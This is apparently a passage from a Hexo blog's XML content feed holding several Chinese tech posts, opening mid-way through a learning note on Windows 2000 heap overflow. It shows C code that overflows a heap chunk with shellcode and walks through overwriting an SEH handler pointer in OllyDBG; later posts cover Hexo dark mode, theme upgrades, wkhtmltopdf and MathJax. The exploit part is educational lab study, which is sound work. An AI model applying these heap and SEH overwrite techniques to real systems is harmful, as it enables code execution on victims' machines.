class="title">MyExceptionHandler</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">	ExitProcess(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	HLOCAL h1 = <span class="number">0</span>, h2 = <span class="number">0</span>;</span><br><span class="line">	HANDLE hp;</span><br><span class="line"></span><br><span class="line">	hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br><span class="line">	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">200</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(h1,shellcode,<span class="number">0x200</span>); <span class="comment">//overflow, 0x200=512</span></span><br><span class="line">	</span><br><span class="line">	__asm <span class="keyword">int</span> <span class="number">3</span></span><br><span class="line">	__try&#123;</span><br><span class="line">		h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	__except(MyExceptionHandler())&#123;&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译环境如下：</p>
<ul>
<li>操作系统：运行于Vmware虚拟机，版本Win 2K SP4 5.00.2195 EN</li>
<li>编译器：Visual C++ 6.0</li>
<li>编译选项：默认选项</li>
<li>build版本：release版</li>
</ul>
<p>可以观察到，本例中shellcode与上例中基本一致，不同之处有二：</p>
<ul>
<li>DWORD SHOOT的目标地址，即shellcode的最后4 Byte，本例中暂为90909090，为异常处理函数地址，在进行一次调试确定后，再替换即可</li>
<li>本例中没有进行上例中对0x7FFDF020处临界区函数RtlEnterCriticalSection()指针的修复，因为本例中并没有改变它。</li>
</ul>
<p>在编译后执行程序之前，先改变OllyDBG设置，不忽略任何异常，如下图:</p>
<img src="/tech/heap-overflow-learning-notes-2/2_2_2_1.png" class="" title="图2.2.2.1">
<p>接着执行程序，在INT3处中断，观察此时栈中的S.E.H chain，View菜单 -&gt; SEH chain，如下图：</p>
<img src="/tech/heap-overflow-learning-notes-2/2_2_2_2.png" class="" title="图2.2.2.2">
<p>但是，这时看到的SEH chain中并没有在我们的程序发生堆溢出异常时需要用到的第一个S.E.H。需要接着执行代码直到调用行的HeapAlloc()函数，这时会出现异常，指令窗口会从用户程序代码转入ntdll.dll中的内核代码，此时再观察S.E.H chain，如下图：</p>
<img src="/tech/heap-overflow-learning-notes-2/2_2_2_3.png" class="" title="图2.2.2.3">
<p>观察上图，0x0012FF2C即为处理本程序第一个异常的S.E.H的地址，前面介绍过，S.E.H是个结构体，其中先后包含着下一个S.E.H的指针和异常处理函数指针，因此，我们DWORD SHOOT的目标地址为 (0x0012FF2C + 4) = 0x0012FF30。</p>
<p>接着，修改C代码第18行shellcode中DWORD SHOOT的目标地址为301200，注释掉第33行的INT3中断，重新编译执行，成功弹窗。</p>
<p>可以看到，这次我们依然需要注释掉INT3，否则编译执行后进入OllyDBG调试后运行，程序是不会正常弹窗的，其原因在0day书中后文中有提到：</p>
<blockquote><p>当异常发生时，系统会顺着S.E.H链表搜索能够处理异常的句柄；一旦找到了恰当的句柄，系统会将已经遍历过的S.E.H中的异常处理函数再调用一遍，这个过程就是所谓的unwind操作，第二轮地调用就是unwind调用。</p>
<p>unwind操作通过kernel32.dll中的一个导出函数RtlUnwind实现，实际上kernel32.dll会转而再去调用ntdll.dll中的同名函数。</p>
<p>最后，还要堆栈中的异常处理做最后一点补充：在使用回调函数之前，系统会判断当前是否处于调试状态，如果处于调试状态，将把异常交给调试器处理。</p>
<footer><strong>王清</strong><cite>《0day安全：软件漏洞分析技术》(第二版) -> P188-190</cite></footer></blockquote>
<p>从上文的解释就可以明白为什么我们的代码会触发异常后会进入ntdll的代码执行，而且也能解释为什么保留INT3编译执行后不会弹窗了，因为在处理异常时系统检测到当前处于调试器中，因此把该异常交给调试器处理了，而OllyDBG跟系统处理异常的方式不同，它并没有调用系统的异常处理函数，因此我们的shellcode没有得到执行。</p>
]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>Learning Notes</tag>
        <tag>Bin</tag>
        <tag>Heap Overflow</tag>
        <tag>OllyDBG</tag>
        <tag>Security</tag>
        <tag>Windows</tag>
        <tag>Windows 2000</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo（Next主题）实现可切换的Dark Mode(暗色背景/夜间模式)</title>
    <url>/tech/hexo-dark-mode-note/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Hexo Dark Mode Note</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr />
<blockquote>
<p>Dark Mode —— 中老年程序🐶的眼睛续命必备功能</p>
</blockquote>
<p>Mac、Win 纷纷推出了 Dark Mode，安卓也原生支持了随着夜幕降临自动调整屏幕亮度（蓝光）的功能，看来保护眼睛、关爱程序猿是大势所趋。</p>
<p>这里，我们尝试了3种使Hexo Next主题切换为darkmode的方式。</p>
<a id="more"></a>
<h1 id="方案1官方最新版next">方案1：官方最新版Next</h1>
<p>Next在最近的几个版本的更新中<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZW1lLW5leHQvaGV4by10aGVtZS1uZXh0L3B1bGwvMTM4Ng==">加入了对darkmode的原生支持<i class="fa fa-external-link-alt"></i></span>，配置非常简单。</p>
<ul>
<li>配置方法：参见 <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0Lm9yZy9kb2NzL2dldHRpbmctc3RhcnRlZC9pbmRleC5odG1sI0RhcmstTW9kZQ==">官方文档<i class="fa fa-external-link-alt"></i></span>和<span class="exturl" data-url="aHR0cHM6Ly9zaXJpdXNxLnRvcC9OZXh0JUU1JThEJTg3JUU3JUJBJUE3LU1hYyVFOCVCRiU4MSVFNyVBNyVCQi5odG1sI0Rhcmttb2Rl">大佬们的文章<i class="fa fa-external-link-alt"></i></span></li>
<li>优点：配置非常简单</li>
<li>缺点：
<ul>
<li>根据自己的测试，Safari和Firefox 没有问题，但是Chrome无效</li>
<li>不能进行切换，而是根据系统偏好（是否是夜间模式）来判断 是否启用</li>
</ul></li>
</ul>
<h1 id="方案2hexo-next-nightmode插件">方案2：hexo-next-nightmode插件</h1>
<ul>
<li>配置方法：请参见<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLzF2OS9oZXhvLW5leHQtbmlnaHRtb2Rl">官方说明<i class="fa fa-external-link-alt"></i></span></li>
<li>优点：可以切换，配置相对简单</li>
<li>缺点：
<ul>
<li>需要额外安装插件</li>
<li>开启后会在侧边栏的个人信息一览(Overview)里添加切换黑白背景的按钮，但是 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLzF2OS9oZXhvLW5leHQtbmlnaHRtb2RlL2lzc3Vlcy8xMA==">当前版本没有默认使用暗色背景的选项<i class="fa fa-external-link-alt"></i></span></li>
<li>默认切换按钮在Overview里，可能会有如下弊端
<ul>
<li>如果设置为默认隐藏侧边栏，则用户首次访问首页时，不知道有夜间模式</li>
<li>在文章页面时，侧边栏是有两个标签组成，默认显示文章大纲。因此只有切换至Overview后才能后点击背景切换按钮</li>
</ul></li>
<li>bug：darkmode下，header位置被选中的category背景色变成了蓝色</li>
</ul></li>
</ul>
<h1 id="方案3引入js库-darkmode.js">方案3：引入js库 <code>darkmode.js</code></h1>
<h2 id="缘由非重点可略过">缘由（非重点可略过）</h2>
<p>从<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZW1lLW5leHQvaGV4by10aGVtZS1uZXh0L3B1bGwvMTM4Ng==">Next加入了对darkmode的原生支持的PR页面的讨论<i class="fa fa-external-link-alt"></i></span>可以看到，在某大佬X向Next官方贡献了原生darkmode的代码后，某网友向其呼吁加一步加上切换按钮。</p>
<p>但大佬X似乎不打算加，并表示该网友可以使用js库 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NhbmRvY2hlL0Rhcmttb2RlLmpz">darkmode.js<i class="fa fa-external-link-alt"></i></span> 去实现。</p>
<p>没想到网友其实是大佬Y，果然在<span class="exturl" data-url="aHR0cHM6Ly95dXpob3V3YW4uY29tLw==">自己的博客<i class="fa fa-external-link-alt"></i></span>成功集成了darkmode.js。</p>
<p>于是另一位网友向大佬Y询问如何集成的具体细节，但是没有得到回应。</p>
<p>既然可行，那就不妨尝试一下，我也按照<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NhbmRvY2hlL0Rhcmttb2RlLmpz">darkmode.js官方的说明<i class="fa fa-external-link-alt"></i></span>操作一番，其中也遇到了些小问题：</p>
<ul>
<li>切换按钮无法点击</li>
<li>切换到夜间模式后，所有图片的颜色也被翻转，这不是我们所期望的</li>
</ul>
<p>为解决这些问题，参考了<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NhbmRvY2hlL0Rhcmttb2RlLmpzL2lzc3Vlcy80">官方相关issue<i class="fa fa-external-link-alt"></i></span>，并且抄了<span class="exturl" data-url="aHR0cHM6Ly95dXpob3V3YW4uY29tLw==">大佬Y的作业<i class="fa fa-external-link-alt"></i></span>。</p>
<h2 id="为next订制darkmode.js">为Next订制darkmode.js</h2>
<p>可以参考这里我fork的next对比具体做了哪些配置和修改：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hleG8tdGhlbWUtbmV4dA==">dog-2/hexo-theme-next<i class="fa fa-external-link-alt"></i></span></p>
<p>最终效果图见文章最后，下面是具体步骤：</p>
<h3 id="将darkmode.js添加为next的submodule">1. 将darkmode.js添加为Next的submodule</h3>
<p>.gitignore 最后添加 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">!<span class="built_in">source</span>/lib/darkmode-js</span><br></pre></td></tr></table></figure></p>
<p>进入 <code>{blog_dir}/themes/next/</code>，执行如下命令 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git submodule add https://github.com/sandoche/Darkmode.js.git <span class="built_in">source</span>/lib/darkmode-js/</span><br></pre></td></tr></table></figure></p>
<h3 id="根据偏好修改配置文件">2. 根据偏好修改配置文件</h3>
<p>根据偏好修改下列配置文件中的其它选项</p>
<ul>
<li>{blog_dir}/themes/next/languages/en.yml</li>
<li>next配置文件中的配置</li>
</ul>
<div class="note warning">
            <p>这里需要注意的是next有两种配置文件的形式，请确认自己是哪一种。 新Next的配置文件，有2种设置方式，请参考官方文档：</p><ul><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZW1lLW5leHQvaGV4by10aGVtZS1uZXh0L2Jsb2IvbWFzdGVyL2RvY3MvemgtQ04vREFUQS1GSUxFUy5tZA==">官方中文<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0Lm9yZy9kb2NzL2dldHRpbmctc3RhcnRlZC9jb25maWd1cmF0aW9u">官方英文<i class="fa fa-external-link-alt"></i></span></li></ul>
          </div>
<h3 id="定制vendors加入darkmode.js">3. 定制vendors加入darkmode.js</h3>
<ol type="1">
<li>修改 <code>{blog_dir}/themes/next/layout/_scripts/vendors.swig</code></li>
<li>修改next配置文件中的针对darkmode以及darkmode-js的配置：
<ul>
<li>确保next原有<code>darkmode</code>选项设置为 <code>false</code></li>
<li>添加darkmode-js开关</li>
<li>添加darkmode-js自定义CDN选项（可选）</li>
</ul></li>
</ol>
<h1 id="最终效果">最终效果</h1>
<img src="/tech/hexo-dark-mode-note/1.gif" class="" title="darkmode.js效果">
]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>Tech</tag>
        <tag>Blog</tag>
        <tag>Hexo</tag>
        <tag>Hexo Next</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo &amp; Next 升级笔记</title>
    <url>/tech/hexo-next-upgrade-note/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Hexo &amp; Next Upgrade Note</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr />
<p>几年没有碰Blog，最近打算重新开始写，因此需要更新hexo以及Next主题。</p>
<p>由于不怎么懂前端，不出意外意外地遇到了一堆坑，这里记录一下：</p>
<h2 id="目的">目的</h2>
<ul>
<li>node: <code>v6.17.1</code> =&gt; <code>v13.7.0</code></li>
<li>hexo: <code>v3.2.x</code> =&gt; <code>v4.2.0</code></li>
<li>next: <code>v4.x</code> =&gt; <code>v7.8.0</code></li>
</ul>
<h2 id="更新-node">更新 node</h2>
<p>我的系统使用nvm管理多版本node，首先更新npm：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install -g npm</span><br></pre></td></tr></table></figure>
<p>清除npm缓存，可能需要 sudo</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm cache clean -f</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="更新-hexo">更新 hexo</h2>
<p>进入blog目录，执行如下命令：</p>
<ul>
<li>更新package.json中的hexo及个插件版本 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install -g npm-check</span><br><span class="line">npm install -g npm-upgrade</span><br><span class="line">npm-check</span><br><span class="line">npm-upgrade</span><br></pre></td></tr></table></figure></li>
<li>更新hexo及所有插件 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm update</span><br></pre></td></tr></table></figure></li>
<li>确认hexo版本号是否已更新 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo version</span><br></pre></td></tr></table></figure></li>
</ul>
<div class="note warning">
            <h3 id="潜在错误">潜在错误</h3>此时运行 hexo generate 命令，若出现了如下错误：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">DTraceProviderBindings MODULE_NOT_FOUND;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>通过重新安装 <code>hexo-cli</code> 可以解决<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm uninstall hexo-cli -g</span><br><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure>
          </div>
<h2 id="更新-next-主题">更新 Next 主题</h2>
<h3 id="备份可选">备份（可选）</h3>
<p>我备份了如下旧配置文件：</p>
<ul>
<li><code>{blog_dir}/themes/next/_config.yml</code></li>
<li><code>{blog_dir}/themes/next/languages/en.yml</code></li>
<li><code>{blog_dir}/themes/next/languages/zh-Hans.yml</code></li>
<li><code>{blog_dir}/themes/next/source/404.yml</code></li>
</ul>
<p>后来发现新版Next变化太大，很多配置项和方式都变了。 但是旧文件可以作为过去喜好的参考。</p>
<h3 id="更新-next">更新 Next</h3>
<p>想要更新Next时，发现已经有了天翻地覆的变化，连github的项目目录都变了，该项目已经社区化：</p>
<ul>
<li>旧目录 <code>~ v5.x</code>：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2lpc3NuYW4vaGV4by10aGVtZS1uZXh0">https://github.com/iissnan/hexo-theme-next<i class="fa fa-external-link-alt"></i></span></li>
<li><p>新目录 <code>v6.x ~</code>：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZW1lLW5leHQvaGV4by10aGVtZS1uZXh0">https://github.com/theme-next/hexo-theme-next<i class="fa fa-external-link-alt"></i></span></p></li>
<li>删除旧的 next <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rm -fm themes/next</span><br></pre></td></tr></table></figure></li>
<li><p>克隆最新的 next <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/theme-next/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure></p></li>
</ul>
<h3 id="配置-next">配置 Next</h3>
<p>从官方文档获悉，Next的配置变了很多。</p>
<p>其实首先该插一句，官网也变了。。。</p>
<ul>
<li>旧官网：<span class="exturl" data-url="aHR0cHM6Ly9ub3Rlcy5paXNzbmFuLmNvbS8=">https://notes.iissnan.com/<i class="fa fa-external-link-alt"></i></span></li>
<li>新官网：<span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0Lm9yZy8=">https://theme-next.org/<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>新Next的配置文件，有2种设置方式，请参考官方文档： - <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZW1lLW5leHQvaGV4by10aGVtZS1uZXh0L2Jsb2IvbWFzdGVyL2RvY3MvemgtQ04vREFUQS1GSUxFUy5tZA==">官方中文<i class="fa fa-external-link-alt"></i></span> - <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9kb2NzL2dldHRpbmctc3RhcnRlZC9jb25maWd1cmF0aW9u">官方英文<i class="fa fa-external-link-alt"></i></span></p>
<p>每个人的配置不尽相同，我只是简单的配置了一部分，这里给出大佬们的非常全面的配置以供参考 - <span class="exturl" data-url="aHR0cHM6Ly90ZGluZy50b3AvYXJjaGl2ZXMvNDJjMzhiMTAuaHRtbA==">Hexo-NexT (v7.0+) 主题配置<i class="fa fa-external-link-alt"></i></span> - <span class="exturl" data-url="aHR0cHM6Ly9zaXJpdXNxLnRvcC9OZXh0JUU0JUI4JUJCJUU5JUEyJTk4JUU3JUJFJThFJUU1JThDJTk2Lmh0bWw=">Next主题美化(仅7.1版本)<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="定制-next">定制 Next</h3>
<h4 id="dark-mode-暗色背景夜间模式">Dark Mode 暗色背景（夜间模式）</h4>
<p>这部分内容较多，我单独写到了另一篇文章里 <a href="/tech/hexo-dark-mode-note/">Hexo（Next主题）Dark Mode(暗色背景/夜间模式)折腾笔记</a></p>
<h4 id="代码块mac-panel特效">代码块Mac Panel特效</h4>
<p>这个属于美化，我没有尝试，请参见<span class="exturl" data-url="aHR0cHM6Ly9oYXNhaWsuY29tL3Bvc3RzL2Q3Mzk5ZTgwLmh0bWw=">大佬的订制<i class="fa fa-external-link-alt"></i></span>。</p>
<h3 id="遗留问题">遗留问题</h3>
<ol type="1">
<li>当前版本的Next 相关文章（<code>hexo-related-popular-posts</code>插件）<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RlYTMvaGV4by1yZWxhdGVkLXBvcHVsYXItcG9zdHMvaXNzdWVzLzIx">无法使用<i class="fa fa-external-link-alt"></i></span>，不知道是不是我的姿势不对</li>
</ol>
<h2 id="参考链接">参考链接</h2>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9zZWN1cml0eXRlY2guc2l0ZS96aC1DTi8zYmEzYmU5Lw==">Hexo版本升级指南<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9qdWVqaW4uaW0vZW50cnkvNWI5NjUxOTVlNTFkNDUwZTU1MTlkMmM0">Hexo的DTraceProviderBindings MODULE_NOT_FOUND问题<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9zZXZlbmNoby5naXRodWIuaW8vYXJjaGl2ZXMvMTQ1MzRiZWIuaHRtbA==">Hexo博客NexT主题从v5.x.x更新到v6.x.x的记录及总结<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9zaXJpdXNxLnRvcC9OZXh0JUU1JThEJTg3JUU3JUJBJUE3LU1hYyVFOCVCRiU4MSVFNyVBNyVCQi5odG1s">Next升级+Mac迁移<i class="fa fa-external-link-alt"></i></span></li>
</ul>
]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>Blog</tag>
        <tag>Hexo</tag>
        <tag>Hexo Next</tag>
      </tags>
  </entry>
  <entry>
    <title>【译】如何将HTML文件转换为连续的（单页）PDF</title>
    <url>/tech/how-to-make-a-continuous-pdf-from-a-html-file/</url>
    <content><![CDATA[<ul>
<li>Author: <span class="exturl" data-url="aHR0cHM6Ly9tZWRpdW0uY29tL0B2aXZpYW5hbWFycXVlej9zb3VyY2U9cG9zdF9wYWdlLS0tLS1jNWYwYWRjOTE0ZDktLS0tLS0tLS0tLS0tLS0tLS0tLS0t">Viviana Márquez<i class="fa fa-external-link-alt"></i></span></li>
<li>Translator: dog2</li>
<li>Source: <span class="exturl" data-url="aHR0cHM6Ly9tZWRpdW0uY29tL0B2aXZpYW5hbWFycXVlei9ob3ctdG8tbWFrZS1hLWNvbnRpbnVvdXMtc2luZ2xlLXBhZ2UtcGRmLWZyb20tYW4taHRtbC1maWxlLWM1ZjBhZGM5MTRkOQ==">How to make a continuous (single page) PDF from an HTML file<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<hr />
<p>（译文 始）</p>
<p>你是否曾经尝试过将HTML文件另存为PDF文件并得到一个丑陋的文件呢？我也掉过这个坑。</p>
<p>本文将介绍根据HTML用两步创建所见即所得的PDF文件。（福利：你还将学习如何创建单页PDF。）</p>
<a id="more"></a>
<h1 id="step-1">Step 1</h1>
<p><img src="https://miro.medium.com/max/1400/1*lJr9kWyKj_QObM7pMRo0fQ.png" /></p>
<p>安装<span class="exturl" data-url="aHR0cHM6Ly93a2h0bWx0b3BkZi5vcmcvZG93bmxvYWRzLmh0bWw=">wkhtmltopdf<i class="fa fa-external-link-alt"></i></span></p>
<h1 id="step-2">Step 2</h1>
<p><img src="https://miro.medium.com/max/1400/1*4-9bQEbUfzetm6erJIhUBA.png" /></p>
<p>在命令行进入相关目录并输入：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wkhtmltopdf input.html output.pdf</span><br></pre></td></tr></table></figure>
<p>其中：</p>
<ul>
<li><code>input.html</code>可以是计算机上的HTML文件或URL。</li>
<li><code>output.pdf</code>是要在当前目录中创建的PDF文件的名称。</li>
</ul>
<p>仅此而已！So Easy！</p>
<h1 id="step-3-福利">Step 3 (福利)</h1>
<p>如果出于某种原因你可能想要创建连续的（单页）PDF，而不是多页的PDF，此时需要以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wkhtmltopdf -T 0 -B 0 --page-width 210mm --page-height 3861mm input.html output.pdf</span><br></pre></td></tr></table></figure>
<p>其中：</p>
<ul>
<li><code>-T 0 -B 0</code> 表示文档中每页顶部和底部没有空白。</li>
<li><code>--page-width 210mm</code> 是A4文档的标准宽度（但是你可以根据需要进行修改）。</li>
<li><code>--page-height 3861mm</code>是你将根据需要调整的文档高度。对于此参数，我建议 文件中的页数乘以297（A4文档的标准高度，以mm为单位）。</li>
</ul>
<p>😊你完成了！感谢你的阅读！</p>
<p>👏如果对你有用，请给我鼓声：）</p>
<h1 id="关于我">关于我：</h1>
<p>旧金山大学数据科学硕士课程学生。</p>
<p><span class="exturl" data-url="aHR0cDovL3ZpdmlhbmFtYXJxdWV6LmNvbS8=">www.VivianaMarquez.com<i class="fa fa-external-link-alt"></i></span></p>
<p>（译文 完）</p>
]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>Tech</tag>
        <tag>PDF</tag>
        <tag>Tips</tag>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title>让Hexo Next (v8.0.0) 支持LaTeX数学公式</title>
    <url>/tech/making-hexo-next-theme-latex-math-equation-supported/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Making Hexo Next v8.0.0 Theme LaTeX Math Equation Supported</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr />
<h1 id="按">按</h1>
<ul>
<li>环境
<ul>
<li>OS：Max OS 10.15</li>
<li>node: 13.7.0</li>
<li>hexo：4.2.1</li>
<li>hexo-cli: 3.1.0</li>
<li>hexo-theme-next: v8.0.0-rc.2</li>
</ul></li>
<li>需求：让hexo的next主题支持渲染LaTeX语法的数学公式。</li>
<li>参考链接：
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9kb2NzL3RoaXJkLXBhcnR5LXNlcnZpY2VzL21hdGgtZXF1YXRpb25zLmh0bWw=">官方文档<i class="fa fa-external-link-alt"></i></span></li>
</ul></li>
</ul>
<a id="more"></a>
<h1 id="步骤">步骤</h1>
<p>根据官方文档，让Next主题支持公式有有两种方式（无法正常渲染请刷新页面）：</p>
<pre class="mermaid" style="text-align: center;">
            graph LR
            H[Hexo] ==> |主题| T(NexT)
T ==> |公式渲染引擎1| MJ{MathJax}
T -.-> |公式渲染引擎2| KT{KaTeX}
style KT text-decoration:line-through

MJ ==> |markdown渲染引擎1| PD(hexo-renderer-pandoc)
MJ -.-> |markdown渲染引擎2| KR(hexo-renderer-kramed)
MJ -.-> |化学公式插件| MC((mhchem))

KT -.-> |markdown渲染引擎1| MDIP(hexo-renderer-markdown-it-plus)
KT -.-> |markdown渲染引擎2| MDI(hexo-renderer-markdown-it)
KT -.-> |公式复制插件| CPTEX((Copy-tex))
KT -.-> |bug| KTBUG>解析$有Bug需手动修复]

          </pre>
<p>我的测试中只有上图中的实体粗线的方式成功，这里就记录一下这种方式的步骤，即</p>
<ul>
<li>NexT =&gt; MathJax =&gt; hexo-renderer-pandoc</li>
</ul>
<ol type="1">
<li><p>安装<span class="exturl" data-url="aHR0cHM6Ly9wYW5kb2Mub3JnL2luc3RhbGxpbmcuaHRtbA==">pandoc<i class="fa fa-external-link-alt"></i></span></p>
<p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">brew install pandoc</span><br></pre></td></tr></table></figure></p></li>
<li><p>将默认的markdown渲染引擎<code>hexo-renderer-marked</code>替换为<code>hexo-renderer-pandoc</code></p>
<p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm un hexo-renderer-marked</span><br><span class="line">npm i hexo-renderer-pandoc</span><br></pre></td></tr></table></figure></p></li>
<li><p>修改next主题配置</p>
<p><div class="note warning">
            <p>Next的配置文件，有2种形式，请参考<span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9kb2NzL2dldHRpbmctc3RhcnRlZC9jb25maWd1cmF0aW9u">官方文档<i class="fa fa-external-link-alt"></i></span></p>
          </div></p>
<p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Math Formulas Render Support</span></span><br><span class="line"><span class="attr">math:</span></span><br><span class="line"><span class="comment"># Default (true) will load mathjax / katex script on demand.</span></span><br><span class="line"><span class="comment"># That is it only render those page which has `mathjax: true` in Front-matter.</span></span><br><span class="line"><span class="comment"># If you set it to false, it will load mathjax / katex srcipt EVERY PAGE.</span></span><br><span class="line"><span class="attr">per_page:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hexo-renderer-pandoc (or hexo-renderer-kramed) required for full MathJax support.</span></span><br><span class="line"><span class="attr">mathjax:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="comment"># See: https://mhchem.github.io/MathJax-mhchem/</span></span><br><span class="line">    <span class="attr">mhchem:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hexo-renderer-markdown-it-plus (or hexo-renderer-markdown-it with markdown-it-katex plugin) required for full Katex support.</span></span><br><span class="line"><span class="attr">katex:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">    <span class="comment"># See: https://github.com/KaTeX/KaTeX/tree/master/contrib/copy-tex</span></span><br><span class="line">    <span class="attr">copy_tex:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">vendors:</span></span><br><span class="line">  <span class="comment"># MathJax</span></span><br><span class="line">  <span class="attr">mathjax:</span> <span class="string">//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js</span></span><br></pre></td></tr></table></figure></p>
<p><code>per_page</code>按需设置，具体可参考注释和官网说明。其他选项需要跟上述设置保持一致。</p></li>
</ol>
<h1 id="测试数学公式">测试数学公式</h1>
<p>代码来自NexT官网，Mathjax渲染的公式已经内置了丰富的右键菜单，可以复制公式代码。</p>
<h2 id="简单公式">简单公式</h2>
<p>带label的公式</p>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line"><span class="formula">$$<span class="tag">\<span class="name">begin</span><span class="string">&#123;equation&#125;</span></span> <span class="tag">\<span class="name">label</span><span class="string">&#123;eq1&#125;</span></span></span></span><br><span class="line"><span class="formula">e=mc^2</span></span><br><span class="line"><span class="formula"><span class="tag">\<span class="name">end</span><span class="string">&#123;equation&#125;</span></span>$$</span></span><br></pre></td></tr></table></figure>
<p><span class="math display">\[\begin{equation} \label{eq1}
e=mc^2
\end{equation}\]</span></p>
<p>根据label引用上述公式</p>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">The famous matter-energy equation <span class="formula">$<span class="tag">\<span class="name">eqref</span><span class="string">&#123;eq1&#125;</span></span>$</span> proposed by Einstein...</span><br></pre></td></tr></table></figure>
<p>The famous matter-energy equation <span class="math inline">\(\eqref{eq1}\)</span> proposed by Einstein...</p>
<h2 id="多行公式">多行公式</h2>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line"><span class="formula">$$<span class="tag">\<span class="name">begin</span><span class="string">&#123;equation&#125;</span></span> <span class="tag">\<span class="name">label</span><span class="string">&#123;eq2&#125;</span></span></span></span><br><span class="line"><span class="formula"><span class="tag">\<span class="name">begin</span><span class="string">&#123;aligned&#125;</span></span></span></span><br><span class="line"><span class="formula">a &amp;= b + c <span class="tag">\<span class="name">\</span></span></span></span><br><span class="line"><span class="formula">  &amp;= d + e + f + g <span class="tag">\<span class="name">\</span></span></span></span><br><span class="line"><span class="formula">  &amp;= h + i</span></span><br><span class="line"><span class="formula"><span class="tag">\<span class="name">end</span><span class="string">&#123;aligned&#125;</span></span></span></span><br><span class="line"><span class="formula"><span class="tag">\<span class="name">end</span><span class="string">&#123;equation&#125;</span></span>$$</span></span><br></pre></td></tr></table></figure>
<p><span class="math display">\[\begin{equation} \label{eq2}
